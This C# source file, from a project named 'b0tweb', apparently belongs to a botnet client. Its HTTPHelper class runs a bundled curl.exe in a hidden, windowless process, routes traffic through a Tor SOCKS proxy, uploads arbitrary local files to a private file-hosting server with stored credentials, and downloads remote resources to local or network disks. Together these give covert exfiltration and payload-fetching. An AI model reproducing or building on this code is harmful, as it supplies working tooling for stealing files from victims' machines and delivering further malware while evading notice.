using System;
using System.IO;
using Newtonsoft.Json;
using System.Diagnostics;

namespace b0tweb
{
    /// <summary>
    /// Upload a file to a private Pomf Clone.
    /// </summary>
    class HTTPHelper
    {
        /// <summary>
        /// Upload a file to the hosted pomf clone on Tor.
        /// </summary>
        /// <param name="filePath">Path to the file to upload.</param>
        /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
        public static string Upload(string filePath)
        {
            string argument = String.Format(
                 "--socks5-hostname {0}:{1}  -F \"files[]=@{2}\" {3}  --user {4}:{5}",
                TorProxy.Host,
                TorProxy.Port,
                filePath,
                Configuration.HTTPServer,
                Configuration.HTTPUsername,
                Configuration.HTTPPassword
            );

            ProcessStartInfo info = new ProcessStartInfo(FileHelper.GetBasePath() + @"\Curl\curl.exe", argument)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process()
            {
                StartInfo = info
            };

            process.Start();

            try
            {
                dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());

                if (json.success == true)
                {
                    return json.files[0].url;
                }

                // Will be set if not successful
                return json.description;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }

        /// <summary>
        /// Download a given resource to a location.
        /// </summary>
        /// <param name="url">Resource URL to fetch.</param>
        /// <param name="location">Download location on a local or network disk.</param>
        /// <returns>Exit code from Curl</returns>
        public static int Download(string url, string location)
        {
            string argument = String.Format(
                 "--socks5-hostname {0}:{1} {2} --user {3}:{4} -o {5}",
                TorProxy.Host,
                TorProxy.Port,
                url,
                Configuration.HTTPUsername,
                Configuration.HTTPPassword,
                location
            );

            ProcessStartInfo info = new ProcessStartInfo(FileHelper.GetBasePath() + @"\Curl\curl.exe", argument)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process()
            {
                StartInfo = info
            };

            process.Start();
            process.WaitForExit();

            return process.ExitCode;
        }
    }
}
